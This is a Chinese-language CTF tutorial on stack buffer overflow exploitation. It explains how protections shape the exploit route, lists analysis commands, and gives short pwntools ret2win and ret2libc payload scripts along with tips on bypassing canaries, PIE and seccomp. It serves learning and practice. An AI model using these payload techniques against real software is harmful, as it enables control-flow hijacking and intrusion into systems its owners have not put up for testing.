# 栈溢出与 BOF

## 原理
缓冲区溢出题的核心不是“往程序里多塞点数据”，而是弄清楚哪些字节会覆盖到哪些控制结构，以及这些控制结构在当前保护条件下能否转化为稳定执行流劫持。最常见的是栈溢出：`gets`、`scanf("%s")`、`read`、`fgets` 长度错误、`strcpy/strcat`、数组越界把超长输入写进固定栈缓冲区，随后覆盖保存的返回地址、栈 canary、保存的基址指针或相邻局部变量。对 CTF 来说，利用路线几乎总是由保护组合决定：无 NX 时可能直接 shellcode；有 NX 则转向 ret2win、ret2libc、ROP、SROP；有 PIE 需要先泄露基址；有 Canary 则必须先绕过或泄露；有 seccomp 时又可能退回 ORW（open-read-write）读 flag 而不是弹 shell。

因此，分析 BOF 题的首要任务是建立“运行时约束图”：程序是 32 位还是 64 位、ELF 保护如何、是否静态链接、libc 版本是否已知、输入机会有几次、是否存在格式化字符串或信息泄露辅助点、是否能重复返回 main、是否有后门函数、能否控制 ROP 参数寄存器。许多题并不需要复杂链子，一个 `win()`、一个 `puts@plt(puts@got)` 泄露后第二轮 ret2libc，或者一条 ORW 链就够了。相比机械套模板，更重要的是确认最短可行链：能直接 ret2win 就不要先搭大 ROP；能 leak 一个 libc 地址就别尝试硬猜 one_gadget；有文件读取目标时优先读 `flag`，不一定非要拿交互 shell。

## 工具与命令示例
```bash
# 1) 查看 ELF 保护，确认 NX/PIE/Canary/RELRO
checksec --file=./vuln

# 2) 生成 cyclic 模式串，确定崩溃偏移
python -c "from pwn import *; print(cyclic(300).decode())"

# 3) 根据寄存器值反查偏移
python -c "from pwn import *; print(cyclic_find(0x6161616b))"

# 4) 查看符号与潜在 win 函数
readelf -s ./vuln | findstr /i "win flag system puts main"

# 5) 枚举常用 ROP gadget
ROPgadget --binary ./vuln | head

# 6) 列出 GOT/PLT，构造泄露链时常用
objdump -R ./vuln

# 7) 在 gdb/pwndbg 中调试崩溃点
gdb -q ./vuln

# 8) 用 pwntools 启动本地进程并发送样本
python -c "from pwn import *; p=process('./vuln'); p.sendline(cyclic(200)); print(p.wait())"
```

## 常见 CTF 题型
### 题型一：ret2win，最短路径直接打隐藏函数
思路：程序内置 `win()` 或 `print_flag()`，且无需复杂参数。只要覆盖返回地址跳过去即可。这类题关键是精确偏移、调用约定和栈对齐。

```python
from pwn import *
elf = ELF('./vuln', checksec=False)
p = process('./vuln')
payload = flat(
    b'A' * 72,
    elf.symbols['win']
)
p.sendline(payload)
p.interactive()
```

### 题型二：两阶段 ret2libc
思路：第一阶段调用 `puts@plt(puts@got)` 泄露 libc 地址，再返回 `main`；第二阶段根据 libc 基址调用 `system('/bin/sh')` 或直接 ORW 读 flag。64 位题尤其常见。

```python
from pwn import *
elf = ELF('./vuln', checksec=False)
rop = ROP(elf)
p = process('./vuln')
payload = flat(
    b'A'*72,
    rop.find_gadget(['pop rdi', 'ret'])[0],
    elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main']
)
p.sendline(payload)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
print(hex(leak))
```

### 题型三：PIE + Canary + 再入 main
思路：题目会故意让你先从格式化字符串或越界读里泄露 canary 与返回地址，再构造第二轮覆盖。没有泄露前不要试图暴力碰 canary。

```python
from pwn import *
# 伪环境示意：先读出 canary 和 pie leak，再第二次发送溢出
# 注意真实题目要根据具体 IO 编写解析逻辑
```

### 题型四：seccomp/沙箱下的 ORW 链
思路：即使拿到控制流，也可能不能 `execve`。这时应调用 `open`, `read`, `write` 或用 SROP 设置寄存器，直接把 `/flag` 内容读出来。

```python
from pwn import *
flag = b'/flag\x00'
# 常见思路：把路径写到 .bss，再 ROP open/read/write
```

## 绕过与进阶技巧
- **先查保护再选路线**：NX、PIE、Canary、RELRO 决定利用方式，别在未知保护下盲写 payload。
- **偏移必须实证**：用 cyclic 或调试器定位，不要凭经验猜 64/72/112。
- **64 位注意栈对齐**：很多 libc 调用前需要额外 `ret` 做 16 字节对齐，否则本地通远程挂。
- **泄露优先级**：有现成 `puts`/`printf`/格式化字符串时，优先拿地址信息；有地址就少走弯路。
- **Canary 不是终点**：它只是要求你先泄露或绕开，比如借格式化字符串、数组越界读、栈回显、逻辑错误。
- **Partial overwrite**：只能覆盖低字节时，可利用 PIE 低位稳定、`one_gadget` 邻近、返回到同页 gadget 等技巧。
- **SROP 与栈迁移**：当 gadget 稀缺或可控空间太小，可考虑 `sigreturn` 或迁移到 `.bss`/heap 上继续铺链。
- **一轮还是两轮**：很多题 IO 允许多次交互，第一轮只负责泄露，第二轮再劫持，稳定性远高于一把梭。
- **远程与本地差异**：libc 版本、栈布局、ASLR、换行截断、超时、缓冲行为都会影响成功率，最终要以远程行为为准。

## 快速检查清单
- [ ] `checksec` 是否已确认 NX、PIE、Canary、RELRO 等保护
- [ ] 是否已用 cyclic 或调试器精确定位覆盖偏移
- [ ] 程序中是否存在 `win()`、`print_flag()` 或可直接利用的后门函数
- [ ] 是否存在可用泄露点获取 libc、PIE、Canary 或栈地址
- [ ] 目标是 ret2win、ret2libc、ROP、SROP 还是 ORW，路径是否最短
- [ ] 64 位下是否考虑了 `pop rdi; ret` 与栈对齐问题
- [ ] 若只有一次输入，链是否必须同时完成泄露与利用；若可多轮，是否应拆成两阶段
- [ ] 远程运行环境与本地 libc/加载地址是否一致，是否需要动态适配
- [ ] seccomp/沙箱是否限制 `execve`，需不需要改成读文件链
- [ ] payload 是否已经在本地和目标环境回代验证，而不是只在 gdb 中偶然成功
